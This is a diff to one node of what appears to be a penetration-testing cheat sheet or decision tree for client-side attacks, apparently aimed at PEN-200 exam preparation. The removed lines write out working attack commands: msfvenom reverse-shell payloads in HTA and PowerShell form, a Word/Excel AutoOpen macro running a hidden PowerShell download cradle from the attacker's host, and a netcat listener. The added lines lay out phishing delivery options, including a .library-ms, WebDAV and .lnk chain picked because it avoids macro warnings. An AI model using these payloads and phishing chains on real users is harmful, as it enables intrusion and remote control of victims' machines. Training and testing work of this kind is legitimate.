@@ -2,12 +2,32 @@
   "id": "client_side",
   "phase": "SHELL",
   "title": "Client-Side Attacks",
-  "body": "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
-  "cmd": "# HTA via msfvenom\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta\npython3 -m http.server 80\n# Deliver: http://$lhost/shell.hta\n\n# VBA macro (Word/Excel)\n# Insert > Module in VBA editor:\nSub AutoOpen()\n  Shell \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\nEnd Sub\n\n# PowerShell download cradle\nIEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')\n\n# Generate PS reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f ps1 > shell.ps1\n\nnc -nlvp $lport",
-  "warn": "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
+  "body": "Get a user to open/click something that runs your code. Pick the delivery based on the target: if Office may not be installed, the Windows Library + shortcut (.library-ms + .lnk) chain is the reliable pick \u2014 it needs no Office and shows no macro warning. HTA and Office macros are alternatives. Set up your listener BEFORE sending anything.",
+  "cmd": "# Decide delivery:\n#   .library-ms + WebDAV + .lnk -> no Office needed, no macro prompt (PEN-200 go-to)\n#   HTA                        -> single file, runs via mshta.exe\n#   Office macro               -> needs Office + macros enabled (.doc, not .docx)\n#   macro_pack                 -> generator: spits out .hta/.lnk/.url/Office from one tool",
+  "warn": "Listener first, payload second. If you send the phish before your WebDAV / web server / nc listener are all up, the one click you get is wasted.",
   "choices": [
     {
-      "label": "User executed — got shell",
+      "label": "Library file + WebDAV + shortcut (no Office, no macro warning)",
+      "next": "client_side_library"
+    },
+    {
+      "label": "HTA (single file, mshta)",
+      "next": "client_side_hta"
+    },
+    {
+      "label": "Office macro (VBA AutoOpen)",
+      "next": "client_side_macro"
+    },
+    {
+      "label": "Generate payloads with macro_pack (.hta/.lnk/.url/Office)",
+      "next": "client_side_macropack"
+    },
+    {
+      "label": "Deliver it by email (swaks)",
+      "next": "client_side_phish_email"
+    },
+    {
+      "label": "User executed \u2014 got shell",
       "next": "shell_upgrade"
     },
     {
